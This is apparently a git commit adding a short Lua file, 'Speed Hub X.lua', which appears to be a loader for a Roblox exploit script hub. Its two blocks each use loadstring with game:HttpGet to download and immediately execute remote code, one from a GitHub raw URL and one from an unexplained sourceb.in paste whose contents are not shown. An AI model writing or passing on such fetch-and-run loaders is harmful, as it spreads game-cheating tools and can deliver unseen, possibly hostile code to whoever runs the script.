9647c1d2bd9e391153b6f07994de736999128e67
AhmadV90 <scriptgenerator0@gmail.com>
2025-07-20 18:26:17 +0800

    Create Speed%20Hub%20X.lua

---
+++ Speed%20Hub%20X.lua
@@ -0,0 +1,7 @@
+task.spawn(function()
+    loadstring(game: HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/PxeQ9ubysF/0", true))()
+end)
